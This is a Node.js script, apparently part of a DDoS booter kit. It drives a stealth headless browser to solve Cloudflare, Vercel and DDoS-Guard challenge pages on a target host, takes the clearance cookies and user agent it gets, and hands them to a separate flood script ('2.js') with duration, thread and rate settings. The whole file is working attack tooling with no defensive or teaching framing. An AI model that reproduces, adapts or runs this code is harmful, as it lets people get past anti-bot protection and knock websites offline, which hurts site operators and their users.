const { connect } = require('puppeteer-real-browser'), { fork } = require('child_process');
const THREADS_FLOOD = 4, FLOOD_FILE = '2.js', HEADERS_TYPES = ['basic', 'undetect'], HEADLESS_MODES = ['legacy', 'new', 'shell', 'true', 'false'], USER_AGENTS = ['@NeganSSHConsole'], LANG = 'en-US', XVFB = false, STEALTH = true, BLOCK_ADS = true, FINGERPRINT = true, TURNSTILE = true, TF = true;
let HeadersBrowser = '', startTime = Date.now(), host = process.argv[2], duration = process.argv[3], threads = process.argv[4] || THREADS_FLOOD, rate = process.argv[5] || 1e3, args = process.argv.slice(6), emulation = args.indexOf('--emulation') !== -1 && args[args.indexOf('--emulation') + 1] && !args[args.indexOf('--emulation') + 1].startsWith('--') ? args[args.indexOf('--emulation') + 1] : false, headers = args.indexOf('--headers') !== -1 && args[args.indexOf('--headers') + 1] && !args[args.indexOf('--headers') + 1].startsWith('--') ? args[args.indexOf('--headers') + 1] : false, headless = args.indexOf('--headless') !== -1 && args[args.indexOf('--headless') + 1] && !args[args.indexOf('--headless') + 1].startsWith('--') ? args[args.indexOf('--headless') + 1] : 'new', optimize = args.includes('--optimize');
if (headers && !HEADERS_TYPES.includes(headers)) { console.error(`[INFO] Invalid headers type(s): ${headers}, valid: ${HEADERS_TYPES.join(', ')}`); process.exit(1); }
if (headless && !HEADLESS_MODES.includes(headless)) { console.error(`[INFO] Invalid headless mode: ${headless}, valid: ${HEADLESS_MODES.join(', ')}`); process.exit(1); }
const sleep = s => new Promise(r => setTimeout(r, s * 1e3));
async function Browser() {
    const ua = USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)], { page, browser } = await connect({ args: ["--no-sandbox", "--no-first-run", "--test-type", "--disable-browser-side-navigation", "--disable-blink-features=AutomationControlled", "--disable-extensions", "--disable-gpu", "--disable-dev-shm-usage", "--disable-features=IsolateOrigins", "--no-zygote", "--ignore-certificate-errors", `--user-agent=${ua}`, `--lang=${LANG}`], headless: 'auto', fingerprint: FINGERPRINT, turnstile: TURNSTILE, tf: TF, stealth: STEALTH, blockAds: BLOCK_ADS });
    try { const p = await page.goto(host, { waitUntil: 'domcontentloaded' }); console.log(`[INFO] Browser Opening Host Page ${host}\n[INFO] Status Code: ${await p.status()}`); await page.waitForNavigation({ waitUntil: 'domcontentloaded', timeout: 1e4 }).catch(() => {}); console.log(`[INFO] Page loaded: ${page.url()}`); const t = await page.evaluate(() => document.title); console.log(`[INFO] Title: ${t}`); await sleep(3); if (['Just a moment...', 'Checking your browser...', '安全检查中……'].includes(t)) { page.on('response', r => HeadersBrowser = r.request().headers()); console.log(`[INFO] Detected Protection ~ Cloudflare Interactive Challenge(Captcha)`); await sleep(6); } else if (t === 'Attention Required! | Cloudflare') console.log("[INFO] Blocked by Cloudflare"); const pt = await page.title().catch(() => "Failed to get title"); console.log(`[INFO] Page Title: ${pt}`); const c = await page.cookies(); if (c.length) console.log(`[INFO] UserAgent: ${ua}\n[INFO] Cookies: ${c.map(e => `${e.name}=${e.value}`).join("; ")}`); return { title: pt, headersall: HeadersBrowser, cookies: c.map(e => `${e.name}=${e.value}`).join(";").trim(), userAgent: ua }; } catch (e) { console.error("Error:", e); } finally { await browser.close(); }
}
async function Start() {
    try { const r = await Browser(); if (!r) return; if (['Just a moment...', 'Checking your browser...', '安全检查中……', 'Vercel Security Checkpoint', 'Just a moment please...', 'You are being redirected...', 'DDoS-Guard'].includes(r.title)) { console.log("[INFO] Failed to bypass"); return await Start(); } const timeTaken = ((Date.now() - startTime) / 1e3).toFixed(2); console.log(`[INFO] Bypass successful solve: ${timeTaken}s`); const floodArgs = [host, duration, THREADS_FLOOD.toString(), rate, r.cookies, r.userAgent]; console.log(`[FLOOD] node ${FLOOD_FILE} "${host}" ${duration} ${THREADS_FLOOD} ${rate} "${r.cookies}" "${r.userAgent}"`); fork(FLOOD_FILE, floodArgs, { silent: true }); setTimeout(() => process.exit(0), duration * 1e3); } catch (e) { console.log(`[ERROR] ${e}`); }
}
console.log(`[INFO] Starting ${threads} browser threads for solving`); for (let i = 0; i < threads; i++) Start();